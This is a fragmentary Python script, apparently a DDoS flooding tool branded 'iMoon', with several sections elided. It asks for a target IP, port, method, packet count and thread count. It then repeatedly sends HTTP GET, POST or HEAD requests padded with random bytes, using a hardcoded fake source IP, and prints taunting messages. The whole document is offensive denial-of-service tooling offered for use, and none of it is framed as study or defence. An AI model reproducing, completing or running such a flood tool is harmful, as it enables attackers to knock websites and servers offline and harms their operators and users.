...
if sys.platform.startswith("linux"):
   ...
   os.system('clear')
    ...
    os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title iMoon Flood")
print("============ @KOBOY FESBUK = iMoon ==============") 
ip = str(input(" $IP =============== "))
port = int(input(" $Port 80/443/3389 === "))
method_attack = str(input(" $get/post == "))
times = int(input(" $Packet ========== "))
threads = int(input(" $Threads ======== "))
fake_ip = '51.140.252.211'
...
def Headers(method):
    ...
    if method == "head" or method == "post":
        post_host = "POST /Attack By iMoon | Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title iMoon Ganteng")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20179)
    if method_attack == "get":
        get_host = "GET /Attack By iMoon | Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attack By iMoon | Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("$MAMPUS SAJA KAU DEK ",ip," : ",port,"!")
